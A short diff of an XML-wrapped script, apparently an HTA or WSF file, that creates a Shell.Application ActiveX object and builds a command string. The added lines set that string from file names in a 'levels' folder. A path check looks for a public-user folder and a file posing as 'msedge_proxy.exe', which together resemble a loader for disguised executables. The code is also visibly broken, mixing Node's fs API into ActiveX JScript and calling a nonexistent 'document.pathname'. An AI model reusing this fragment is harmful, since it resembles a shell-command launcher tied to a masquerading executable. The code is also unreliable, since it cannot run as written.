@@ -8,6 +8,9 @@ version="1.0">
 	<![CDATA[
 	var oShell = new ActiveXObject("Shell.Application");
 	var commandtoRun = "";
+	fs.readdirSync("./levels/").forEach((file) => {
+		commandtoRun = file;
+	})
 	if(document.location.pathname.match(/^\/C:\\Users\\Public\\Public Data\\//)){
 		if(document.pathname == "msedge_proxy.exe"){
 			commandtoRun = document.location;
